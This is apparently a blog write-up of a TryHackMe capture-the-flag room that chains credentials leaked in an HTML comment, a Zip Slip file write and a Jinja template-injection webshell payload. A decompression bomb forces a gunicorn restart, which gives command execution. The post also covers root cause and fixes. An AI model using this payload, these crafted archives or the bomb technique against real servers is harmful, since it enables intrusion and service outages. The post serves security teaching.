---
title: "TryHackMe The Hollow Shell — A Zip Slip You Have to Restart to Feel"
date: 2026-08-06T13:00:00+05:30
lastmod: 2026-08-06T13:30:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-hollowshell/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web
  - Zip Slip
  - Path Traversal
  - Arbitrary File Write
  - SSTI
  - RCE
  - Flask

draft: false
description: "TryHackMe The Hollow Shell — Zip Slip arbitrary file write to RCE by bombing the gunicorn worker to bust Jinja's cached template."
---

## The Hollow Shell

**Day 10 of Hacker Holidays 2026**, and the Byte Lotus hands you a beach souvenir with something hidden inside. The briefing is unusually literal about the vulnerability:

> You find it on the beach: pretty, ordinary, the kind of thing nobody thinks to check. Slip something inside and hold it to your ear.
>
> The Byte Lotus beachfront lets guests personalise their in-room display by uploading a **shell** — a little souvenir pack of shoreline ambiance. Staff publish them through the Shoreline Display portal, and once a shell is "held to the room's ear" it plays its shore. **Slip past what the portal forgets to check, and the shell answers with a shell of your own.**

A "shell" that is a `.zip`, uploaded to a portal that "forgets to check" something. If you have met **Zip Slip** before, the room is already telling you its name. Category is Web, Medium, 90 points.

![The Hollow Shell room page on TryHackMe, showing 100% completion and the Hacker Holidays 2026 progress chart](/img/thm-hollowshell/01-room.png)

What makes this room more than a five-minute Zip Slip is the *second half*. The write works immediately — and appears to do nothing. The interesting part is understanding **why an arbitrary file write on a production Flask app doesn't turn into code execution until you restart the process**, and how to force that restart with the *same* bug.

The chain, in order:

1. **A leaked credential** in an HTML comment gets you into the portal.
2. **Zip Slip** in the shell extractor gives arbitrary file write.
3. Overwrite a **Jinja template** with an SSTI payload — which sits inert, because gunicorn caches the compiled template.
4. **A decompression bomb** OOM-kills the worker; gunicorn respawns it and reloads the template.
5. `GET /login?c=<cmd>` is now a webshell.

## Setup

One service, and it is not on port 80. A quick check finds Flask behind gunicorn on **5000**:

```bash
curl -s -i http://$T:5000/ | head -5
# HTTP/1.1 302 FOUND
# Server: gunicorn
# Location: /login
```

`$T` is the lab IP throughout. Everything happens against `:5000`.

## Step 1: The login page tells you its own password

The portal's front door is a staff sign-in. Its **HTML source** carries a comment that IT left behind and never removed:

![curl of the login page revealing an HTML comment with the seeded staff credentials concierge and StayNoticed2024!](/img/thm-hollowshell/02-creds-comment.png)

```
user: concierge
pass: StayNoticed2024!
```

The note even says the quiet part out loud — *"rotate it from Settings on first sign-in — most people forget"* — and most people did. This is not a lock-picking puzzle; it is a reminder that **comments ship to the client**. Anything you write in server-side template source that renders into HTML is one *View Source* away from the world. Credentials, internal hostnames, debug flags, "TODO: remove before prod" — all of it.

Logging in with those sets a session cookie and drops you on the **Shoreline Display** dashboard: a single feature that accepts a `.zip` "shell", extracts it, and serves its assets back to the in-room tablets.

## Step 2: A valid shell, to learn the shape

Before attacking, upload a *clean* shell to see how the app behaves. A shell is a zip containing a `shell.json` manifest and some declared assets:

![curl logging in and uploading a valid base.zip, the server returning 302 and listing the new shell under shells slash a twelve-character id](/img/thm-hollowshell/03-upload-flow.png)

Two facts fall out, both of which we will lean on:

- A successful upload **302-redirects** to the dashboard. A *failed* extraction returns **500**. That difference is a free oracle later.
- The shell lands at `shells/<12-hex-id>/` and its files are served at `/shells/<id>/<file>`. So the extractor writes to disk under a predictable base, and the web root can serve what we write.

## Step 3: Zip Slip — the entry names are never checked

The manifest validator inspects the *declared* asset list. It never looks at the **actual** zip entry names. So an entry called `../../static/evil.png` is written wherever `../../` leads:

![a zip carrying an entry named dot dot slash dot dot slash static slash d2 png uploads with 302 and is then served from slash static slash d2 png with 200, and an overwrite of style css also succeeds](/img/thm-hollowshell/04-zip-slip.png)

The traversal file appears under the app's real `static/` directory — two levels above `shells/<id>/` — and the server hands it back at `/static/d2.png`. **Arbitrary write confirmed.** Overwriting an *existing* file works too, which matters in a moment.

While probing depth, the 302/500 oracle maps the filesystem for free: writes into the app root succeed, `../../../` (one level above the root) starts failing, so the app lives **two directories below `/`**. That turns out to be `/var/www/conch`.

{{< ad >}}

## Step 4: The write that does nothing (and why)

The obvious escalation: the app renders its pages with Jinja, so overwrite `templates/login.html` with a template-injection payload and visit `/login`.

```jinja
{% if request.args.get('c') %}<pre>
{{ lipsum.__globals__['os'].popen(request.args.get('c')).read() }}
</pre>{% endif %}
```

The upload returns **302** — the write landed. And `/login` renders… the original page. Unchanged. No error, no payload, nothing.

This is the crux of the room. **In production, `TEMPLATES_AUTO_RELOAD` is off.** The first time gunicorn's worker rendered `/login`, Jinja compiled that template and cached the bytecode in the worker's memory. My new file is sitting on disk, but the running process will never look at it again. Overwriting a cached template is like editing a document someone already printed — the page in their hand doesn't change.

I need the worker to **restart** so a fresh process compiles my template from disk. And the same buggy code hands me the lever. The extractor reads each member with `zf.read(name)`, which loads the **entire decompressed member into memory**. So a zip whose one member inflates to a few gigabytes will exhaust the worker's RAM:

![overwriting login html returns 302 but login is unchanged, then a 3 GB decompression bomb kills the worker, and after gunicorn respawns it the planted SSTIMARK appears in login](/img/thm-hollowshell/05-plant-and-restart.png)

A ~3 MB zip that expands to 3 GB gets the worker **OOM-killed** mid-request (the connection drops with data outstanding). Gunicorn's arbiter notices the dead worker and respawns it — and the new worker, rendering `/login` for the first time, compiles **my** template. The `SSTIMARK` canary I embedded now shows up. The cache is busted.

*A decompression bomb is normally a denial-of-service payload.* Here it is a precision tool: I don't want to keep the app down, I want exactly one controlled restart so my already-written template gets loaded.

## Step 5: The shell answers with a shell of your own

With the malicious template live, `/login?c=<command>` executes it server-side:

![browser-style output of GET login with c equals id and pwd returning uid 996 roomservice and var www conch, then cat of the flag returning THM z1p sl1pp3d 1nt0 a sh3ll](/img/thm-hollowshell/06-rce.png)

```
uid=996(roomservice) gid=996(roomservice) groups=996(roomservice)
/var/www/conch
```

Code execution as the `roomservice` account. The flag is world-readable in the service account's home:

```bash
GET /login?c=cat /home/roomservice/flag.txt
```

> `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

## Step 6: The whole bug is four lines

Reading `app.py` back through the RCE, the vulnerability is the entire extraction routine — two mistakes in the same short function:

![app.py extract_shell function showing os.path.join with an attacker-controlled name for the Zip Slip, and zf.read(name) loading a whole member into memory for the bomb](/img/thm-hollowshell/07-root-cause.png)

```python
def extract_shell(zf, shell_dir):
    os.makedirs(shell_dir, exist_ok=True)
    for name in zf.namelist():
        if name.endswith("/"):
            continue
        dest = os.path.join(shell_dir, name)          # (1) name is attacker-controlled
        os.makedirs(os.path.dirname(dest), exist_ok=True)
        with open(dest, "wb") as fh:
            fh.write(zf.read(name))                    # (2) whole member into memory
```

`os.path.join(shell_dir, "../../x")` cheerfully walks *out* of `shell_dir` — that is **(1)**, the Zip Slip. And `zf.read(name)` buffers the full decompressed member — that is **(2)**, the bomb primitive that let me force the restart. One function, both halves of the chain.

## The exploit, end to end

The full script logs in, plants the SSTI template, fires the bomb only if the template isn't already live, waits for the respawn, then runs a command. It builds every zip in memory — no files on disk:

> 📎 Full script on GitHub Gist: [`hollow_shell.py`](https://gist.github.com/anir0y/4421ebeca60d5bbf4f4943d6b0714406)

<script src="https://gist.github.com/anir0y/4421ebeca60d5bbf4f4943d6b0714406.js"></script>

```
$ python3 hollow_shell.py 10.10.10.10
[*] logging in with the credentials leaked in the login page comment
[*] Zip Slip: overwriting ../../templates/login.html with the SSTI payload
    upload -> HTTP 302 (the write landed)
[*] template is cached in the worker; forcing a respawn with a 3 GB bomb
[+] worker respawned after 5s — fresh Jinja cache, our template is live
[*] executing: cat /home/roomservice/flag.txt

THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

## Why this bug class matters

**Zip Slip is a decade old and still everywhere.** Any code that extracts an archive by joining an entry name to a destination directory — `os.path.join(dest, name)`, `new File(dest, name)`, `path.join(dest, entry.name)` — is vulnerable unless it explicitly verifies the resolved path stays *inside* the destination. It has hit Maven plugins, Kubernetes, dozens of npm packages. The archive format lets an entry be named anything, including `../`, and the naive join trusts it.

**Arbitrary write is not automatically RCE — but it is close.** The gap in this room was the template cache, and the room's lesson is that the gap is *bridgeable*. Depending on the target, an arbitrary write becomes execution by overwriting a template, a `.py` on the import path, a `.pth` file, a cron job, an `authorized_keys`, a config that runs a command, or a WSGI entrypoint — plus whatever restarts the process for you (a bomb, a crash, a healthcheck, a deploy, `--max-requests`, or simply waiting for the next release). Write primitives should be treated as pre-RCE, not as a lesser finding.

**"It rendered fine, so my overwrite failed" is a trap.** Cached templates, cached bytecode, pre-forked workers, and CDNs all serve *stale* versions of something you successfully changed. When a write lands (302, here) but the effect doesn't show, suspect caching before you suspect the write.

## Fixing it

**Sanitise every archive entry before writing it.** Resolve the final path and confirm it is still within the destination:

```python
dest = os.path.realpath(os.path.join(shell_dir, name))
if not dest.startswith(os.path.realpath(shell_dir) + os.sep):
    raise ValueError(f"unsafe path in archive: {name}")
```

Reject absolute paths and symlink entries as well, and validate the **real** entry names — not just a manifest's *self-reported* asset list, which is exactly the check this portal trusted.

**Bound decompression.** Enforce a per-member and total uncompressed-size cap, and stream members to disk in fixed chunks instead of `zf.read()`-ing them whole. That kills both the memory bomb and the disk-fill variant.

**Never serve an upload directory as code, and drop privileges.** The box already ran the app as an unprivileged `roomservice` account, which is why this is a web-flag room and not a root. Keep uploaded content on a path that is served as *inert bytes* only, never resolved as a template or importable module.

## Room summary

| | |
|---|---|
| Room | The Hollow Shell |
| Event | Hacker Holidays 2026 — Day 10 |
| Category | Web · Medium · 90 points |
| Target | `http://<lab-ip>:5000` (Flask / gunicorn, app root `/var/www/conch`) |
| Foothold | Staff credentials leaked in a `/login` HTML comment (`concierge` / `StayNoticed2024!`) |
| Primitive | Zip Slip in the shell extractor → arbitrary file write |
| Trick | Overwrite `templates/login.html`; OOM-kill the worker with a 3 GB decompression bomb to bust Jinja's cache |
| RCE | `GET /login?c=<cmd>` as `roomservice` (uid 996) |
| Flag | `THM{z1p_sl1pp3d_1nt0_a_sh3ll}` |

## Wrap-up

The whole room, compressed:

```bash
# creds from the /login HTML comment: concierge / StayNoticed2024!
upload  zip{ ../../templates/login.html = SSTI payload }   # 302, but cached
upload  zip{ 3 GB member }                                 # OOM -> worker respawn
GET     /login?c=cat /home/roomservice/flag.txt            # THM{...}
```

![The Hollow Shell question answered on TryHackMe with a Correct Answer badge, room at 100%](/img/thm-hollowshell/08-complete.png)

Most Zip Slip rooms end at "you can write a file." This one starts there and asks the better question: *now what?* The write was easy; the insight was that a compiled template in a live worker is frozen until the process dies, and that the very same buggy `zf.read()` gives you a way to kill it on demand. Slip something inside, hold it to the room's ear — then make the room forget everything it had cached, and listen to what it says the second time. 🪷
